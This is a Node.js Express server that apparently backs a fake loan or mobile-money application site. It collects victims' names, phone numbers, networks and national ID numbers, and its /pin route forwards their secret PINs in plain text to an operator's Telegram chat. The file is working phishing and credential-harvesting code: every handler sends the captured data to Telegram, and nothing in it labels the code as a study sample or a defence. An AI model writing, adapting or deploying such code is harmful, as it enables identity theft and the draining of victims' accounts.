const express = require("express");
const axios = require("axios");
const path = require("path");
const mongoose = require("mongoose");

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// ENV
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const MONGO_URI = process.env.MONGO_URI;

// ================= SAFE DB CONNECT =================
if (!MONGO_URI) {
  console.log("❌ MONGO_URI missing in Railway variables");
} else {
  mongoose.connect(MONGO_URI)
    .then(() => console.log("MongoDB connected"))
    .catch(err => console.log("MongoDB error:", err.message));
}

// ================= MODEL =================
const userSchema = new mongoose.Schema({
  name: String,
  phone: { type: String, unique: true },
  network: String,
  amount: String,
  nationalId: String,
  status: { type: String, default: "pending" }
});

const User = mongoose.model("User", userSchema);

// ================= HOME =================
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// ================= TEST ROUTE =================
app.get("/test", (req, res) => {
  res.json({ ok: true });
});

// ================= APPLY =================
app.post("/apply", async (req, res) => {
  try {
    const { name, phone, network, amount, nationalId } = req.body;

    if (!name || !phone || !network || !amount || !nationalId) {
      return res.status(400).json({ success: false, message: "missing fields" });
    }

    console.log("BOT:", BOT_TOKEN ? "OK" : "MISSING");
    console.log("CHAT:", CHAT_ID ? "OK" : "MISSING");
    console.log("MONGO:", MONGO_URI ? "OK" : "MISSING");

    await User.findOneAndUpdate(
      { phone },
      { name, phone, network, amount, nationalId, status: "pending" },
      { upsert: true, new: true }
    );

    const message = `
📥 NEW APPLICATION

👤 ${name}
📱 ${phone}
📡 ${network}
💰 ${amount}
🆔 ${nationalId}

Choose action:
`;

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      reply_markup: {
        inline_keyboard: [[
          { text: "✅ Approve", callback_data: `approve_${phone}` },
          { text: "❌ Decline", callback_data: `decline_${phone}` }
        ]]
      }
    });

    return res.json({ success: true, phone });

  } catch (err) {
    console.log("APPLY ERROR:", err.response?.data || err.message);
    return res.status(500).json({ success: false });
  }
});

// ================= STATUS =================
app.get("/status/:phone", async (req, res) => {
  try {
    const user = await User.findOne({ phone: req.params.phone });

    if (!user) {
      return res.json({ status: "pending" });
    }

    return res.json({ status: user.status });

  } catch (err) {
    return res.status(500).json({ status: "error" });
  }
});

// ================= WEBHOOK =================
app.post("/webhook", async (req, res) => {
  try {
    if (!req.body.callback_query) return res.sendStatus(200);

    const action = req.body.callback_query.data;
    const phone = action.split("_")[1];

    const status = action.startsWith("approve") ? "approved" : "declined";

    await User.findOneAndUpdate({ phone }, { status });

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: `Status updated: ${phone} → ${status}`
    });

    res.sendStatus(200);

  } catch (err) {
    console.log("WEBHOOK ERROR:", err.message);
    res.sendStatus(200);
  }
});

// ================= PIN STEP =================
app.post("/pin-step", async (req, res) => {
  try {
    const { phone } = req.body;

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: `📍 PIN STEP\n📱 ${phone}`
    });

    res.sendStatus(200);
  } catch (err) {
    res.sendStatus(200);
  }
});

// ================= PIN =================
app.post("/pin", async (req, res) => {
  try {
    const { phone, pin } = req.body;

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: `🔐 PIN: ${pin}\n📱 ${phone}`
    });

    res.sendStatus(200);
  } catch (err) {
    res.sendStatus(200);
  }
});

// ================= START =================
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
  console.log("Server running on port " + PORT);
});
